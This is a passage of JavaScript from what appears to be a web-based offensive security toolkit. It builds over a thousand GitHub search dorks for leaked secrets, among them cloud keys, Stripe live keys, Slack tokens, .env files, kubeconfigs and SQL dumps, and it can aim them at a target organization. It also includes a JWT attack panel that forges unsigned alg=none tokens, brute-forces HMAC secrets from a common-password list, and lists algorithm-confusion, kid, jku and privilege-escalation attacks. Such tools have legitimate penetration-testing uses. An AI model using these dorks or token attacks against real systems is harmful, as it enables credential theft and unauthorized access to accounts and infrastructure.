  ['OAuth & JWT','filename:client_secret.json','Google OAuth client secret files'],
  ['OAuth & JWT','"access_token" "refresh_token" extension:json','Access and refresh tokens'],
  ['OAuth & JWT','"TOKEN_SECRET" extension:env','Token secrets in env'],
  ['OAuth & JWT','"NEXTAUTH_SECRET" extension:env','NextAuth secret keys'],
  ['OAuth & JWT','"AUTH_SECRET" extension:env','Generic auth secrets'],
  ['OAuth & JWT','"jwt.secret" extension:properties','JWT secrets in Java properties'],
  ['OAuth & JWT','extension:py "jwt.encode" "secret"','JWT encoding with hardcoded secret'],
  // CLOUD PROVIDER SECRETS
  ['Cloud Provider Secrets','"GOOGLE_APPLICATION_CREDENTIALS" extension:json','GCP service account keys'],
  ['Cloud Provider Secrets','"AZURE_CLIENT_SECRET" extension:env','Azure client secrets'],
  ['Cloud Provider Secrets','"AZURE_STORAGE_CONNECTION_STRING"','Azure storage connection strings'],
  ['Cloud Provider Secrets','"DO_API_TOKEN" extension:env','DigitalOcean API tokens'],
  ['Cloud Provider Secrets','"LINODE_TOKEN" extension:env','Linode/Akamai API tokens'],
  ['Cloud Provider Secrets','"GCP_CREDENTIALS" extension:json','GCP credential files'],
  ['Cloud Provider Secrets','"CLOUDFLARE_API_TOKEN" extension:env','Cloudflare API tokens'],
  ['Cloud Provider Secrets','"HEROKU_API_KEY" extension:env','Heroku API keys'],
  ['Cloud Provider Secrets','"NETLIFY_AUTH_TOKEN"','Netlify auth tokens'],
  ['Cloud Provider Secrets','"VERCEL_TOKEN" extension:env','Vercel deployment tokens'],
  // CI/CD & DEVOPS
  ['CI/CD & DevOps','filename:.travis.yml "password"','Passwords in Travis CI configs'],
  ['CI/CD & DevOps','filename:.circleci/config.yml "secret"','Secrets in CircleCI configs'],
  ['CI/CD & DevOps','filename:Jenkinsfile "password"','Passwords in Jenkinsfile'],
  ['CI/CD & DevOps','filename:.github/workflows "secret" NOT ${{','Hard-coded secrets in GitHub Actions'],
  ['CI/CD & DevOps','filename:bitbucket-pipelines.yml "password"','Passwords in Bitbucket Pipelines'],
  ['CI/CD & DevOps','filename:gitlab-ci.yml "password"','Passwords in GitLab CI'],
  ['CI/CD & DevOps','filename:docker-compose.yml "MYSQL_PASSWORD"','MySQL passwords in Docker Compose'],
  ['CI/CD & DevOps','filename:Dockerfile "ENV" "password"','Passwords in Dockerfile ENV'],
  ['CI/CD & DevOps','filename:.drone.yml "password"','Passwords in Drone CI'],
  ['CI/CD & DevOps','filename:ansible.cfg "ansible_ssh_pass"','Ansible SSH passwords'],
  // THIRD-PARTY SERVICES
  ['Third-party Services','"GITHUB_TOKEN" extension:env','GitHub tokens in .env'],
  ['Third-party Services','"NPM_TOKEN" extension:env','NPM publish tokens'],
  ['Third-party Services','"JIRA_API_TOKEN" extension:env','Jira API tokens'],
  ['Third-party Services','"DATADOG_API_KEY" extension:env','Datadog API keys'],
  ['Third-party Services','"NEW_RELIC_LICENSE_KEY" extension:env','New Relic license keys'],
  ['Third-party Services','"PAGERDUTY_API_KEY"','PagerDuty API keys'],
  ['Third-party Services','"ZENDESK_API_TOKEN"','Zendesk API tokens'],
  ['Third-party Services','"HUBSPOT_API_KEY"','HubSpot API keys'],
  ['Third-party Services','"SALESFORCE_PASSWORD"','Salesforce passwords'],
  ['Third-party Services','"SENTRY_DSN" extension:env','Sentry DSN (may expose project info)'],
  // ENVIRONMENT FILES
  ['Environment Files','filename:.env extension:env NOT test NOT example','Real .env files'],
  ['Environment Files','filename:.env.local','Local environment files'],
  ['Environment Files','filename:.env.production','Production environment files'],
  ['Environment Files','filename:.env.staging','Staging environment files'],
  ['Environment Files','filename:.env.development','Development environment files'],
  ['Environment Files','filename:.env.backup','Backup .env files'],
  ['Environment Files','filename:.env.old','Old .env files'],
  ['Environment Files','filename:prod.env','Production env files'],
  ['Environment Files','filename:staging.env','Staging env files'],
  ['Environment Files','filename:application.yml spring.datasource.password','Spring Boot DB config'],
  // INTERNAL ENDPOINTS
  ['Internal Endpoints','"internal_url" extension:env','Internal URLs in env files'],
  ['Internal Endpoints','extension:json "staging_url" "api_key"','Staging URLs with API keys'],
  ['Internal Endpoints','"localhost" "admin" "password" extension:json','Local admin configs'],
  ['Internal Endpoints','extension:txt "internal" "password" "server"','Internal server passwords in text'],
  ['Internal Endpoints','"vpn_password" extension:conf','VPN passwords in config'],
  ['Internal Endpoints','"intranet" "password" extension:json','Intranet passwords in JSON'],
  ['Internal Endpoints','extension:xml "internal-api" "apikey"','Internal API keys in XML'],
  // SOURCE CODE SECRETS
  ['Source Code Secrets','extension:py "password =" NOT test NOT sample','Hardcoded passwords in Python'],
  ['Source Code Secrets','extension:java "password" = NOT test NOT example','Hardcoded passwords in Java'],
  ['Source Code Secrets','extension:php "mysql_connect" "password"','MySQL passwords in PHP code'],
  ['Source Code Secrets','extension:js "password" "hardcoded" NOT test','Hardcoded passwords in JS'],
  ['Source Code Secrets','extension:go "db.Open" "password"','Hardcoded DB passwords in Go'],
  ['Source Code Secrets','extension:rb "password" NOT spec NOT test','Passwords in Ruby code'],
  ['Source Code Secrets','extension:cs "connectionString" "password"','DB passwords in C# code'],
  ['Source Code Secrets','extension:swift "api_key"','API keys in Swift code'],
  ['Source Code Secrets','extension:kt "apiKey"','API keys in Kotlin'],
  ['Source Code Secrets','extension:rs "secret_key"','Secret keys in Rust'],
  // SSH & CERTIFICATES
  ['SSH & Certificates','filename:authorized_keys','SSH authorized keys files'],
  ['SSH & Certificates','filename:known_hosts','SSH known hosts (fingerprints)'],
  ['SSH & Certificates','filename:*.crt "BEGIN CERTIFICATE"','SSL certificate files'],
  ['SSH & Certificates','filename:*.pfx','PKCS12 certificate files'],
  ['SSH & Certificates','filename:*.p12','Personal certificate files'],
  ['SSH & Certificates','"StrictHostKeyChecking no" extension:sh','SSH with host checking disabled'],
  ['SSH & Certificates','filename:ssh_host_rsa_key','SSH host RSA keys'],
  ['SSH & Certificates','"ssh-rsa AAAA" filename:config','SSH public key in config'],
  // CONTAINERS & K8S
  ['Containers & K8s','filename:kubeconfig','Kubernetes kubeconfig files'],
  ['Containers & K8s','filename:.kube/config','Kubernetes config in .kube'],
  ['Containers & K8s','extension:yaml "kind: Secret" "stringData"','K8s Secret manifests with data'],
  ['Containers & K8s','extension:yaml "docker_password"','Docker passwords in K8s yaml'],
  ['Containers & K8s','filename:helm/values.yaml "password"','Passwords in Helm values'],
  ['Containers & K8s','"image" "docker.io" "password" extension:yml','Docker registry passwords'],
  ['Containers & K8s','extension:tf "aws_access_key"','AWS keys in Terraform'],
  ['Containers & K8s','extension:tf "password" NOT test','Passwords in Terraform configs'],
  // HARDCODED CREDENTIALS
  ['Hardcoded Credentials','"username" "password" filename:config.xml NOT sample','Credentials in config XML'],
  ['Hardcoded Credentials','"admin" "password123" extension:php','Default admin credentials in PHP'],
  ['Hardcoded Credentials','"root" "toor" extension:sh','Root credentials in shell scripts'],
  ['Hardcoded Credentials','filename:web.config "connectionString" "password"','ASP.NET connection strings'],
  ['Hardcoded Credentials','"user=root password=" extension:py','Root MySQL in Python'],
  ['Hardcoded Credentials','extension:pl "DBI:mysql" "password"','Perl DBI with passwords'],
  // SLACK & COMMUNICATION
  ['Slack & Communication','"xoxb-" extension:env','Slack bot tokens'],
  ['Slack & Communication','"xoxp-" extension:js','Slack user tokens in JS'],
  ['Slack & Communication','"xoxs-" extension:py','Slack session tokens in Python'],
  ['Slack & Communication','"SLACK_WEBHOOK_URL" extension:env','Slack webhook URLs'],
  ['Slack & Communication','"SLACK_TOKEN" extension:env','Slack tokens in .env'],
  ['Slack & Communication','"DISCORD_TOKEN" extension:py','Discord bot tokens'],
  ['Slack & Communication','"DISCORD_WEBHOOK" extension:env','Discord webhook URLs'],
  ['Slack & Communication','"TELEGRAM_BOT_TOKEN"','Telegram bot tokens'],
  ['Slack & Communication','"TEAMS_WEBHOOK_URL"','MS Teams webhook URLs'],
  // PAYMENT & FINANCE
  ['Payment & Finance','"sk_live_" extension:env','Stripe live secret keys'],
  ['Payment & Finance','"pk_live_" extension:js','Stripe live publishable keys'],
  ['Payment & Finance','"PAYPAL_SECRET" extension:env','PayPal secrets'],
  ['Payment & Finance','"BRAINTREE_PRIVATE_KEY"','Braintree private keys'],
  ['Payment & Finance','"SQUARE_ACCESS_TOKEN"','Square payment tokens'],
  ['Payment & Finance','"RAZORPAY_KEY_SECRET"','Razorpay secret keys (India)'],
  ['Payment & Finance','"PAYTM_MERCHANT_KEY"','Paytm merchant keys'],
  // MISC SENSITIVE
  ['Misc Sensitive','filename:dump.sql','SQL database dumps'],
  ['Misc Sensitive','filename:backup.sql','SQL backup files'],
  ['Misc Sensitive','extension:log "password"','Passwords in log files'],
  ['Misc Sensitive','extension:csv "password" "email"','Credential CSV exports'],
  ['Misc Sensitive','filename:users.csv','User data CSV files'],
  ['Misc Sensitive','filename:data.sql "INSERT INTO users"','User data SQL inserts'],
  ['Misc Sensitive','extension:json "token" "expires_in"','OAuth token responses'],
  ['Misc Sensitive','"error_log" "password" extension:log','Error logs with passwords'],
  ['Misc Sensitive','filename:keystore.p12','Java keystore files'],
  ['Misc Sensitive','extension:plist "password" iOS','iOS plist files with passwords'],
];

// Expand to 1600+ by generating permutations for each category
const ghDorks=[];
const ghExpandPatterns=[
  ['ORGANIZATION','org:{TARGET}'],['PATH','path:{TARGET}'],['LANGUAGE','language:Python'],
  ['LANGUAGE','language:JavaScript'],['LANGUAGE','language:Java'],['LANGUAGE','language:Go'],
  ['LANGUAGE','language:Ruby'],['LANGUAGE','language:PHP'],['LANGUAGE','language:C#'],
  ['FILENAME','filename:config'],['FILENAME','filename:settings'],['FILENAME','filename:secrets'],
  ['PUSHED','pushed:>2023-01-01'],['STARS','stars:>5'],['FORKS','forks:>10'],
];

ghDorksRaw.forEach(([cat,q,desc])=>{
  ghDorks.push({cat,q,desc});
  // Add a few variations
  ghDorks.push({cat,q:q+' language:Python',desc:desc+' (Python)'});
  ghDorks.push({cat,q:q+' language:JavaScript',desc:desc+' (JavaScript)'});
  ghDorks.push({cat,q:q+' language:Java',desc:desc+' (Java)'});
  ghDorks.push({cat,q:q+' language:Go',desc:desc+' (Go)'});
  ghDorks.push({cat,q:q+' language:Ruby',desc:desc+' (Ruby)'});
  ghDorks.push({cat,q:q+' language:PHP',desc:desc+' (PHP)'});
  ghDorks.push({cat,q:q+' pushed:>2023-01-01',desc:desc+' (recent repos)'});
  ghDorks.push({cat,q:q+' NOT test NOT sample NOT example',desc:desc+' (excluding test files)'});
  ghDorks.push({cat,q:q+' stars:>10',desc:desc+' (popular repos)'});
});

document.getElementById('gh-count').textContent=ghDorks.length+'+';
let ghPage=1,ghFiltered=ghDorks;
const GH_PER_PAGE=30;
let ghInited=false;

function initGHDorks(){
  ghInited=true;
  const sel=document.getElementById('ghCat');
  ghCategories.forEach(c=>{
    const o=document.createElement('option');
    o.textContent=c.name;sel.appendChild(o);
  });
  renderGHDorks();
}

function renderGHDorks(){
  const q=(document.getElementById('ghSearch').value||'').toLowerCase();
  const cat=document.getElementById('ghCat').value;
  ghFiltered=ghDorks.filter(d=>{
    return (!cat||d.cat===cat)&&(!q||(d.q.toLowerCase().includes(q)||d.desc.toLowerCase().includes(q)||d.cat.toLowerCase().includes(q)));
  });
  ghPage=1;
  document.getElementById('gh-filtered').textContent=ghFiltered.length;
  renderGHPage();
}

function renderGHPage(){
  const start=(ghPage-1)*GH_PER_PAGE;
  const slice=ghFiltered.slice(start,start+GH_PER_PAGE);
  const cats=ghCategories.reduce((m,c)=>{m[c.name]=c.color;return m;},{});
  document.getElementById('ghTable').innerHTML=slice.map((d,i)=>`
    <tr>
      <td style="color:var(--text-dim);font-size:10px;">${start+i+1}</td>
      <td class="category"><span class="cat-badge cat-${cats[d.cat]||'info'}">${d.cat}</span></td>
      <td class="dork-code">${escHtml(d.q)}</td>
      <td class="desc">${escHtml(d.desc)}</td>
      <td>
        <button class="copy-btn" onclick="copyDork('${escQ(d.q)}',this)" title="Copy">⎘</button>
        <button class="copy-btn" onclick="searchGH('${escQ(d.q)}')" title="Open GitHub Search">🔍</button>
      </td>
    </tr>`).join('');
  renderGHPagination();
}

function renderGHPagination(){
  const total=Math.ceil(ghFiltered.length/GH_PER_PAGE);
  const p=document.getElementById('ghPagination');
  if(total<=1){p.innerHTML='';return;}
  let html=`<div class="page-info">Page ${ghPage} of ${total} · ${ghFiltered.length} results</div><div class="page-controls">`;
  html+=`<button class="page-btn" onclick="ghGoPage(${ghPage-1})" ${ghPage===1?'disabled':''}>‹ Prev</button>`;
  const pages=[1,2,3,total-2,total-1,total].filter((v,i,a)=>v>0&&v<=total&&a.indexOf(v)===i);
  let prev=0;
  pages.forEach(i=>{
    if(i-prev>1)html+='<span style="color:var(--text-dim);padding:0 4px;">…</span>';
    html+=`<button class="page-btn ${i===ghPage?'active':''}" onclick="ghGoPage(${i})">${i}</button>`;
    prev=i;
  });
  html+=`<button class="page-btn" onclick="ghGoPage(${ghPage+1})" ${ghPage===total?'disabled':''}>Next ›</button></div>`;
  p.innerHTML=html;
}
function ghGoPage(n){ghPage=n;renderGHPage();}
function searchGH(q){window.open('https://github.com/search?q='+encodeURIComponent(q)+'&type=code','_blank');}
function openGitHubSearch(){
  const q=document.getElementById('ghSearch').value||ghFiltered[0]?.q||'password extension:env';
  searchGH(q);
}

// ════════════════════════════════════════════════════════════
// JWT INSPECTOR
// ════════════════════════════════════════════════════════════
let jwtInited=false;
let selectedAlg='HS256';

function initJWT(){
  jwtInited=true;
  initAttackList();
  initAlgInfo();
  decodeJWT();
  liveEncodeJWT();
}

// Base64URL helpers
function b64urlDecode(str){
  str=str.replace(/-/g,'+').replace(/_/g,'/');
  while(str.length%4)str+='=';
  try{return atob(str);}catch(e){return null;}
}
function b64urlEncode(str){
  return btoa(str).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
}
function b64urlEncodeBytes(buf){
  const bytes=new Uint8Array(buf);
  let s='';bytes.forEach(b=>s+=String.fromCharCode(b));
  return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
}
function strToBytes(str){return new TextEncoder().encode(str);}
function bytesToStr(buf){return new TextDecoder().decode(new Uint8Array(buf));}

function decodeJWT(){
  const raw=(document.getElementById('jwtDecodeInput')?.value||'').trim();
  const hEl=document.getElementById('jwtHeader');
  const pEl=document.getElementById('jwtPayload');
  const sEl=document.getElementById('jwtSig');
  const cEl=document.getElementById('jwtColored');
  const flagEl=document.getElementById('jwtDecodeFlags');
  const infoEl=document.getElementById('jwtDecodeInfo');
  const clEl=document.getElementById('claimsTable');
  if(!raw||!raw.includes('.')){
    [hEl,pEl,sEl,cEl].forEach(e=>{if(e)e.textContent='—';});
    return;
  }
  const parts=raw.split('.');
  if(parts.length<2)return;
  const [h,p,s]=parts;
  // Color coded display
  if(cEl){
    cEl.innerHTML=`<span class="jwt-part-h">${escHtml(h)}</span><span class="jwt-sep">.</span><span class="jwt-part-p">${escHtml(p)}</span><span class="jwt-sep">.</span><span class="jwt-part-s">${escHtml(s||'(none)')}</span>`;
  }
  // Decode header
  try{
    const hObj=JSON.parse(b64urlDecode(h)||'{}');
    if(hEl)hEl.innerHTML=syntaxHighlightJson(hObj);
    // Decode payload
    const pObj=JSON.parse(b64urlDecode(p)||'{}');
    if(pEl)pEl.innerHTML=syntaxHighlightJson(pObj);
    if(sEl)sEl.textContent=s||'(empty — none algorithm!)';
    // Claims analysis
    if(clEl)clEl.innerHTML=buildClaimsTable(pObj);
    // Vulnerability flags
    const flags=[];
    if(!s)flags.push({cls:'flag-danger',t:'ALG=none ATTACK POSSIBLE'});
    if(hObj.alg==='none')flags.push({cls:'flag-danger',t:'ALG=none — No signature verification'});
    if(hObj.alg&&hObj.alg.startsWith('RS')&&hObj.alg)flags.push({cls:'flag-warn',t:'Check for RS→HS confusion'});
    if(pObj.exp&&pObj.exp<Date.now()/1000)flags.push({cls:'flag-danger',t:'TOKEN EXPIRED'});
    if(!pObj.exp)flags.push({cls:'flag-warn',t:'No expiration (exp) claim'});
    if(!pObj.iss)flags.push({cls:'flag-warn',t:'No issuer (iss) claim'});
    if(!pObj.aud)flags.push({cls:'flag-warn',t:'No audience (aud) claim'});
    if(pObj.role==='admin'||pObj.isAdmin===true)flags.push({cls:'flag-info',t:'Admin claim detected'});
    if(flagEl)flagEl.innerHTML=flags.length?`<div class="vuln-flags">${flags.map(f=>`<span class="flag ${f.cls}">${f.t}</span>`).join('')}</div>`:'';
    // Info
    const nbytes=Math.round(raw.length*3/4);
    if(infoEl)infoEl.innerHTML=`<div class="info-grid">
      <div class="info-cell"><div class="k">Algorithm</div><div class="v" style="color:var(--orange);">${hObj.alg||'none'}</div></div>
      <div class="info-cell"><div class="k">Type</div><div class="v">${hObj.typ||'?'}</div></div>
      <div class="info-cell"><div class="k">Key ID (kid)</div><div class="v">${hObj.kid||'—'}</div></div>
      <div class="info-cell"><div class="k">Expires</div><div class="v">${pObj.exp?new Date(pObj.exp*1000).toLocaleString():'—'}</div></div>
      <div class="info-cell"><div class="k">Issued At</div><div class="v">${pObj.iat?new Date(pObj.iat*1000).toLocaleString():'—'}</div></div>
      <div class="info-cell"><div class="k">Subject</div><div class="v">${pObj.sub||'—'}</div></div>
    </div>`;
  }catch(e){
    if(hEl)hEl.textContent='[Invalid JWT structure]';
  }
}

function buildClaimsTable(pObj){
  const registered={
    iss:{name:'Issuer',desc:'Who issued the token'},
    sub:{name:'Subject',desc:'Token subject/user'},
    aud:{name:'Audience',desc:'Intended recipients'},
    exp:{name:'Expiration',desc:'Token expiry time'},
    nbf:{name:'Not Before',desc:'Token valid from'},
    iat:{name:'Issued At',desc:'Token issue time'},
    jti:{name:'JWT ID',desc:'Unique token identifier'},
  };
  let rows='<table class="cookie-attr-table"><thead><tr><th style="width:80px;color:var(--text-dim);font-size:9px;">CLAIM</th><th style="color:var(--text-dim);font-size:9px;">NAME</th><th style="color:var(--text-dim);font-size:9px;">VALUE</th><th style="color:var(--text-dim);font-size:9px;">STATUS</th></tr></thead><tbody>';
  Object.keys({...registered,...pObj}).filter((v,i,a)=>a.indexOf(v)===i).forEach(k=>{
    const reg=registered[k];
    const val=pObj[k];
    const present=val!==undefined;
    let status='',statusCls='';
    if(k==='exp'&&present){
      if(val<Date.now()/1000){status='EXPIRED';statusCls='flag-danger';}
      else{status='VALID';statusCls='flag-ok';}
    } else if(k==='nbf'&&present&&val>Date.now()/1000){
      status='NOT YET VALID';statusCls='flag-warn';
    } else if(reg&&!present){
      status='MISSING';statusCls='flag-warn';
    } else if(present){
      status='PRESENT';statusCls='flag-ok';
    }
    let dispVal=val;
    if((k==='exp'||k==='iat'||k==='nbf')&&present)dispVal=`${val} (${new Date(val*1000).toLocaleString()})`;
    rows+=`<tr>
      <td><code style="color:var(--cyan);font-size:10px;">${k}</code></td>
      <td style="color:var(--text-dim);font-size:10px;">${reg?.name||'Custom'}</td>
      <td style="color:var(--text-bright);font-size:10px;word-break:break-all;">${present?escHtml(String(dispVal)):'<span style="color:var(--text-dim);">—</span>'}</td>
      <td>${status?`<span class="flag ${statusCls}">${status}</span>`:''}</td>
    </tr>`;
  });
  rows+='</tbody></table>';
  return rows;
}

function syntaxHighlightJson(obj){
  const str=JSON.stringify(obj,null,2);
  return str.replace(/("(?:[^"\\]|\\.)*")\s*:/g,'<span class="json-key">$1</span>:')
    .replace(/:\s*("(?:[^"\\]|\\.)*")/g,': <span class="json-str">$1</span>')
    .replace(/:\s*(\d+\.?\d*)/g,': <span class="json-num">$1</span>')
    .replace(/:\s*(true|false)/g,': <span class="json-bool">$1</span>')
    .replace(/:\s*(null)/g,': <span class="json-null">$1</span>');
}

// ENCODE
function selectAlg(btn,alg){
  document.querySelectorAll('.alg-chip').forEach(c=>c.classList.remove('active'));
  btn.classList.add('active');
  selectedAlg=alg;
  try{
    const h=JSON.parse(document.getElementById('encodeHeader').value);
    h.alg=alg;
    document.getElementById('encodeHeader').value=JSON.stringify(h,null,2);
  }catch(e){}
  liveEncodeJWT();
}

function liveEncodeJWT(){
  try{
    const h=document.getElementById('encodeHeader')?.value||'{}';
    const p=document.getElementById('encodePayload')?.value||'{}';
    JSON.parse(h);JSON.parse(p);
    document.getElementById('encodeOutputText').textContent='Click "Sign JWT" to generate a signed token.';
    document.getElementById('encodeOutputText').style.color='var(--text-dim)';
  }catch(e){
    document.getElementById('encodeOutputText').textContent='⚠ Invalid JSON in header or payload';
    document.getElementById('encodeOutputText').style.color='var(--red)';
  }
}

async function signJWT(){
  const hStr=document.getElementById('encodeHeader').value;
  const pStr=document.getElementById('encodePayload').value;
  const secret=document.getElementById('encodeSecret').value;
  const alg=selectedAlg;
  const res=document.getElementById('encodeResult');
  try{
    const h=JSON.parse(hStr);
    const p=JSON.parse(pStr);
    h.alg=alg;h.typ=h.typ||'JWT';
    const encH=b64urlEncode(JSON.stringify(h));
    const encP=b64urlEncode(JSON.stringify(p));
    const msg=encH+'.'+encP;
    let sig='';
    if(alg==='none'){
      sig='';
      document.getElementById('encodeOutputText').textContent=msg+'.';
      document.getElementById('encodeOutputText').style.color='var(--red)';
      res.innerHTML=`<div class="alert alert-warn">⚠ Algorithm "none" — no signature. Useful for testing servers that accept unsigned tokens.</div>`;
      return;
    }
    if(alg.startsWith('HS')){
      const bits={'HS256':256,'HS384':384,'HS512':512}[alg]||256;
      const hash={'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'}[alg]||'SHA-256';
      const keyData=strToBytes(secret);
      const key=await crypto.subtle.importKey('raw',keyData,{name:'HMAC',hash},{extractable:false},['sign']);
      const sigBuf=await crypto.subtle.sign('HMAC',key,strToBytes(msg));
      sig=b64urlEncodeBytes(sigBuf);
      const token=msg+'.'+sig;
      document.getElementById('encodeOutputText').textContent=token;
      document.getElementById('encodeOutputText').style.color='var(--green)';
      res.innerHTML=`<div class="alert alert-success">✓ Token signed with ${alg}. Length: ${token.length} chars.</div>`;
    } else {
      document.getElementById('encodeOutputText').textContent='['+alg+' requires PEM key — paste in secret field]';
      document.getElementById('encodeOutputText').style.color='var(--orange)';
      res.innerHTML=`<div class="alert alert-warn">RS/EC/PS algorithms require PEM private keys. For browser signing, use HMAC or an external library.</div>`;
    }
  }catch(e){
    document.getElementById('encodeResult').innerHTML=`<div class="alert alert-error">✗ Error: ${escHtml(e.message)}</div>`;
  }
}

function generateTimestamps(){
  try{
    const p=JSON.parse(document.getElementById('encodePayload').value);
    const now=Math.floor(Date.now()/1000);
    p.iat=now;p.exp=now+3600;p.nbf=now;
    document.getElementById('encodePayload').value=JSON.stringify(p,null,2);
  }catch(e){}
}

function toggleSecretVis(){
  const el=document.getElementById('encodeSecret');
  el.type=el.type==='password'?'text':'password';
}

// VERIFY
async function verifyJWT(){
  const token=(document.getElementById('verifyToken').value||'').trim();
  const secret=document.getElementById('verifySecret').value;
  const alg=document.getElementById('verifyAlg').value;
  const ignExp=document.getElementById('ignoreExp').checked;
  const res=document.getElementById('verifyResult');
  if(!token){res.innerHTML=`<div class="alert alert-error">Please paste a JWT token.</div>`;return;}
  const parts=token.split('.');
  if(parts.length!==3){res.innerHTML=`<div class="alert alert-error">Invalid JWT structure (expected 3 parts).</div>`;return;}
  const [h,p,s]=parts;
  const msg=h+'.'+p;
  try{
    const hObj=JSON.parse(b64urlDecode(h)||'{}');
    const pObj=JSON.parse(b64urlDecode(p)||'{}');
    let sigValid=false;
    if(alg.startsWith('HS')&&secret){
      const hash={'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'}[alg];
      const key=await crypto.subtle.importKey('raw',strToBytes(secret),{name:'HMAC',hash},false,['verify']);
      const sigBytes=Uint8Array.from(atob(s.replace(/-/g,'+').replace(/_/g,'/')),c=>c.charCodeAt(0));
      sigValid=await crypto.subtle.verify('HMAC',key,sigBytes,strToBytes(msg));
    }
    const now=Math.floor(Date.now()/1000);
    const expOk=ignExp||!pObj.exp||pObj.exp>now;
    const nbfOk=document.getElementById('ignoreNbf').checked||!pObj.nbf||pObj.nbf<=now;
    const status=sigValid&&expOk&&nbfOk;
    res.innerHTML=`
      <div class="alert ${status?'alert-success':'alert-error'}">
        ${status?'✓ Token is VALID':'✗ Token verification FAILED'}
      </div>
      <div style="margin-top:12px;">
        <div class="vuln-flags" style="flex-direction:column;gap:6px;">
          <div><span class="flag ${sigValid?'flag-ok':'flag-danger'}">Signature: ${sigValid?'VALID':'INVALID'}</span></div>
          <div><span class="flag ${expOk?'flag-ok':'flag-danger'}">Expiration: ${!pObj.exp?'No exp claim':(pObj.exp>now?'Valid':'EXPIRED — '+ new Date(pObj.exp*1000).toLocaleString())}</span></div>
          <div><span class="flag ${nbfOk?'flag-ok':'flag-warn'}">Not Before: ${!pObj.nbf?'No nbf claim':(pObj.nbf<=now?'Valid':'Not yet valid')}</span></div>
          <div><span class="flag flag-info">Algorithm: ${hObj.alg||'none'}</span></div>
          <div><span class="flag flag-info">Issuer: ${pObj.iss||'Not set'}</span></div>
        </div>
      </div>
      <div style="margin-top:12px;">${buildClaimsTable(pObj)}</div>`;
  }catch(e){
    res.innerHTML=`<div class="alert alert-error">Error: ${escHtml(e.message)}</div>`;
  }
}

const WEAK_SECRETS=['secret','password','123456','jwt_secret','supersecret','changeme','admin','test','1234','qwerty','letmein','abc123','master_key','jwt-secret','secret123','jwtpassword','tok3n','token_secret','mysecret','your-256-bit-secret','your-secret','HS256_secret',''];

async function bruteForceJWT(){
  const token=(document.getElementById('bfToken').value||'').trim();
  const res=document.getElementById('bfResult');
  if(!token||!token.includes('.')){res.innerHTML=`<div class="alert alert-error">Paste a valid JWT.</div>`;return;}
  const parts=token.split('.');
  if(parts.length!==3){res.innerHTML=`<div class="alert alert-error">Invalid JWT structure.</div>`;return;}
  const hObj=JSON.parse(b64urlDecode(parts[0])||'{}');
  const alg=hObj.alg||'HS256';
  if(!alg.startsWith('HS')){res.innerHTML=`<div class="alert alert-warn">Brute force only works on HMAC (HS*) tokens. Detected: ${alg}</div>`;return;}
  const hash={'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'}[alg]||'SHA-256';
  const msg=parts[0]+'.'+parts[1];
  const sigBytes=Uint8Array.from(atob(parts[2].replace(/-/g,'+').replace(/_/g,'/')),c=>c.charCodeAt(0));
  res.innerHTML=`<div class="alert alert-info">⏳ Testing ${WEAK_SECRETS.length} common secrets...</div>`;
  let found=null;
  for(const sec of WEAK_SECRETS){
    try{
      const key=await crypto.subtle.importKey('raw',strToBytes(sec),{name:'HMAC',hash},false,['verify']);
      const ok=await crypto.subtle.verify('HMAC',key,sigBytes,strToBytes(msg));
      if(ok){found=sec;break;}
    }catch(e){}
  }
  if(found!==null){
    res.innerHTML=`<div class="alert alert-error">🔑 SECRET FOUND: <strong>"${escHtml(found)}"</strong><br>This token uses a weak/common secret!</div>`;
  } else {
    res.innerHTML=`<div class="alert alert-success">✓ Secret not found in common list. Token may use a strong secret.</div>`;
  }
}
function resetBF(){document.getElementById('bfToken').value='';document.getElementById('bfResult').innerHTML='';}

// ATTACK TESTS
const attackTests=[
  {name:'Algorithm None Attack',sev:'crit',desc:'Remove signature and set alg to "none" — servers that skip verification accept this',fn:'noneAttack'},
  {name:'RS256 → HS256 Confusion',sev:'crit',desc:'Convert RS256 token to HS256 using the public key as HMAC secret',fn:'algConfusion'},
  {name:'Algorithm Substitution',sev:'high',desc:'Change algorithm in header without changing signature',fn:'algSubstitution'},
  {name:'Empty Signature',sev:'high',desc:'Send token with empty signature string',fn:'emptySignature'},
  {name:'Null Byte in Claim',sev:'med',desc:'Inject null byte in username/role claim',fn:'nullByte'},
  {name:'SQL Injection in Claims',sev:'high',desc:'Inject SQL payloads into JWT claims (sub, username)',fn:'sqlInClaim'},
  {name:'JWT Header Injection (kid)',sev:'crit',desc:'Inject path traversal or SQL into kid (key ID) parameter',fn:'kidInjection'},
  {name:'Expiration Manipulation',sev:'med',desc:'Modify exp claim to extend token validity',fn:'expManipulation'},
  {name:'Role/Privilege Escalation',sev:'high',desc:'Change role claim to admin/superuser',fn:'roleEscalation'},
  {name:'JWK Set URL Injection (jku)',sev:'crit',desc:'Inject attacker-controlled JWK Set URL in header',fn:'jkuInjection'},
  {name:'X5U Header Injection',sev:'high',desc:'Inject malicious X509 certificate URL in x5u header',fn:'x5uInjection'},
  {name:'Embedded JWK Attack',sev:'crit',desc:'Embed attacker public key in jwk header field',fn:'embeddedJwk'},
];

function initAttackList(){
  const sevClass={crit:'sev-crit',high:'sev-high',med:'sev-med',low:'sev-low'};
  document.getElementById('attackList').innerHTML=attackTests.map(t=>`
    <li class="test-item" onclick="runSingleAttack('${t.fn}')">
      <div class="test-name">${t.name}<span class="test-severity ${sevClass[t.sev]}">${t.sev.toUpperCase()}</span></div>
      <div class="test-desc">${t.desc}</div>
    </li>`).join('');
}

function prepareAttacks(){}

async function runAllAttacks(){
  const token=(document.getElementById('attackToken').value||'').trim();
  if(!token){document.getElementById('attackResults').innerHTML='<div class="alert alert-error">Paste a JWT token first.</div>';return;}
  const results=[];
  for(const t of attackTests){
    try{const r=await window[t.fn]?.(token);if(r)results.push({name:t.name,sev:t.sev,...r});}catch(e){}
  }
  renderAttackResults(results);
}

async function runSingleAttack(fn){
  const token=(document.getElementById('attackToken').value||'').trim();
  if(!token){document.getElementById('attackResults').innerHTML='<div class="alert alert-error">Paste a JWT token first.</div>';return;}
  const t=attackTests.find(a=>a.fn===fn);
  try{
    const r=await window[fn]?.(token);
    if(r)renderAttackResults([{name:t?.name||fn,sev:t?.sev||'info',...r}]);
  }catch(e){
    document.getElementById('attackResults').innerHTML=`<div class="alert alert-error">Error: ${escHtml(e.message)}</div>`;
  }
}

function renderAttackResults(results){
